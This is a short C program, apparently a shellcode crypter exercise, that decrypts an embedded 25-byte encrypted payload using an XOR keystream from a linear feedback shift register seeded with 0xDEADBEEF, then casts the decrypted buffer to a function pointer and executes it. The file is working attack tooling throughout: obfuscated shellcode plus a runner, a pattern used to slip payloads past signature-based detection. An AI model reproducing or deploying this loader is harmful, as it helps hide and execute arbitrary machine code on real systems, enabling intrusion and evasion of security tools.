#include<stdint.h>
#include<string.h>

unsigned char shellcode[] = 
"\x71\x41\x53\x6f\x20\x30\x4c\x17\x96\xd3\x9b\x9b\x8a\x40\x71\x14\x82\xa6\xfc\x6c\x4d\xc7\xe4\x13\x3d";

uint32_t iv = 0xDEADBEEF;
uint8_t tacts = 0x0F;


uint32_t shift_bits(uint32_t shift_register) 
{
    uint32_t a1 = (shift_register >> 23) & 0x01;
    uint32_t a2 = (shift_register >> 22) & 0x01;
    uint32_t a3 = (shift_register >> 21) & 0x01;
    uint32_t a4 = (shift_register >> 16) & 0x01;
    uint32_t a5 = 0x01;

    uint32_t bit_to_push = (a1 + a2 + a3 + a4 + a5) & 0x01;

    shift_register = shift_register << 1;        
    shift_register = shift_register | bit_to_push;

    return shift_register;    
}

uint8_t get_result_byte(uint32_t shift_register)
{
    uint8_t* a = &shift_register;
    uint8_t result = *a ^ *(a+1) ^ *(a+2) ^ *(a+3);
    
    return result;
} 

void transform(unsigned char* shellcode, uint32_t iv, uint8_t tacts)
{
    uint32_t shift_register = iv;
    uint8_t tacts_count = tacts;

    uint8_t tact = 0;    
    for(tact = 0; tact < tacts_count; tact++)
    {
        shift_register = shift_bits(shift_register);
    }

    int iter = 0;
    int shellcode_length = strlen(shellcode);
    for(iter = 0; iter < shellcode_length; iter++) 
    {
        uint8_t result = get_result_byte(shift_register);        
        shellcode[iter] = shellcode[iter] ^ result;
        
        shift_register = shift_bits(shift_register);
    }
}

int main()
{
    transform(shellcode, 0xDEADBEEF, 0x0F);

    int (*ret)() = (int(*)())shellcode;
    ret();
 
    return 0;   
}
